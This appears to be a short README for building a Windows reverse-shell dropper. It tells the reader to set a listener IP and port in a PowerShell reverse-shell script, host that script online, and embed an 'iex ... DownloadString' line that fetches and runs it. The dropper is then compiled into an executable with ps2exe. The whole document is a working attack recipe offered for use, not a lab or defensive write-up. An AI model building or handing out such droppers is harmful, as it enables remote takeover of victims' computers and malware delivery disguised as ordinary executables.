### 1. Modify  rshell.ps1
set your IP address and listen port:
'''
$LHOST = "XXX.XXX.XXX.XXX"; 
$LPORT = XXXXX;
'''

### 2. Install ps2exe module
'''
Install-Module ps2exe
'''

### 3. Upload rshell.ps1 file as plain text somewhere and paste link to it into Dropper.ps1:
>iex(New-Object Net.WebClient).DownloadString('YOUR LINK HERE');

### 4. Compile Dropper.ps1 with >Win-Ps2exe

### 5. Now you have your own exe shell dropper.